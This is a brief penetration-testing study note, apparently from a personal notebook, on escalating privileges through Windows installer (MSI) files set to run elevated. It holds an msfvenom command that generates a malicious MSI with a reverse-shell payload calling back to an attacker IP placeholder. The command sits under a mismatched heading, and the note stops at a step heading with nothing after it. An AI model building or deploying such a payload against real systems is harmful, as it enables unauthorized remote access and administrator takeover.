Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, <mark style="background: #BBFABBA6;">these can be configured to run with higher privileges from any user account (even unprivileged ones)</mark>. This could potentially allow us to generate a malicious MSI file that would run with admin privileges

**<mark style="background: #FF5582A6;">Check Registry Values</mark>:**

- Command: 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[LocalPort] -f msi -o malicious.msi
```

- Purpose: Create a malicious MSI file with a reverse shell payload.

- **<mark style="background: #FF5582A6;">Run Malicious Installer</mark>:**
